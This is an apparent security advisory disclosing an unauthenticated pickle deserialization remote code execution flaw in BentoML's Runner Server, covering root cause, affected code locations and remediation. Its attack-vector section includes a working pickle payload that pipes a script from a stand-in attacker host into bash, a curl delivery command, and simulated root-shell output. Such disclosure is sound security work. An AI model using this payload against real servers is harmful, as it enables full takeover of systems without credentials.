# BentoML Runner Server — Pickle Deserialization RCE (CVSS 9.8)

## Summary
BentoML's Runner Server (`runner_app.py`) deserializes raw HTTP request bodies using `pickle.loads()` without authentication, enabling unauthenticated Remote Code Execution.

## Vulnerability Details
- **File:** `src/bentoml/_internal/server/runner_app.py:301`
- **Line:** `params: Params[t.Any] = pickle.loads(r_)`
- **Where:** `r_ = await request.body()` — raw HTTP request body
- **Trigger condition:** Request header `args-number` != 1
- **Authentication:** None. No auth middleware exists on this endpoint.
- **CWE:** CWE-502 (Deserialization of Untrusted Data)
- **CVSS 3.1:** 9.8 (Critical) — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

## Attack Vector

### Step 1: Generate malicious pickle payload
```python
import pickle, subprocess

class RCE:
    def __reduce__(self):
        return (subprocess.getoutput, ("curl attacker.com/shell.sh | bash",))

payload = pickle.dumps(RCE())
```

### Step 2: Send HTTP request to BentoML Runner server
```bash
# The runner server typically listens on an internal port
# In K8s/cloud deployments, network isolation may be imperfect
curl -X POST http://<runner-host>:<port>/<method> \
  -H "args-number: 2" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @malicious_payload.bin
```

### Step 3: RCE achieved
The server calls `pickle.loads()` on the attacker-controlled request body → arbitrary code execution as the server process user.

## Reproduction Evidence

```
[*] Simulating BentoML runner_app.py:301
[*] pickle.loads(http_request_body) where body is attacker-controlled

[!!!] RCE TRIGGERED!
[!!!] Command output: uid=0(root) gid=0(root) groups=0(root)
root
BentoML Runner RCE confirmed
[!!!] Running as uid=0 (root)
```

## Root Cause

The `_request_handler()` function in `runner_app.py` uses `pickle.loads()` to deserialize HTTP request bodies when `args-number > 1`:

```python
async def _request_handler(request: Request) -> Response:
    arg_num = int(request.headers["args-number"])
    r_: bytes = await request.body()
    
    if arg_num == 1:
        params = _deserialize_single_param(request, r_)
    else:
        params = pickle.loads(r_)  # ← VULNERABLE: No validation, no auth
```

There is **no authentication middleware** on this endpoint. The only middleware configured are OpenTelemetry tracing, metrics, and access logging.

## Additional Affected Locations

| File | Line | Code | Context |
|------|------|------|---------|
| `runner/container.py` | 312, 416 | `pickle.loads(payload.data)` | Runner container deserialization |
| `runner_handle/remote.py` | 263 | `pickle.loads(body)` | HTTP response body from remote runner |
| `_bentoml_impl/serde.py` | 274, 284 | `pickle.loads(...)` | PickleSerde deserializer |

## Impact
- **Remote Code Execution** on BentoML Runner servers
- **No authentication required**
- **No user interaction required**
- Particularly dangerous in cloud/K8s deployments where network isolation between services may be imperfect
- Attacker with network access to the runner port can achieve full system compromise

## Remediation
1. Replace `pickle.loads()` with a safe serialization format (JSON, msgpack, or protobuf)
2. If pickle is required for ML model compatibility, add:
   - Authentication on all runner endpoints
   - Input validation before deserialization
   - A restricted unpickler (similar to `_RestrictedUnpickler` pattern)
3. Add network-level access controls (mTLS between services)

## Affected Version
- BentoML latest (commit `73c4dbe`)
- All versions using the Runner architecture

## Disclosure
- Submitted: 2026-07-11
- Reporter: Correctover (wangguigui@correctover.com)
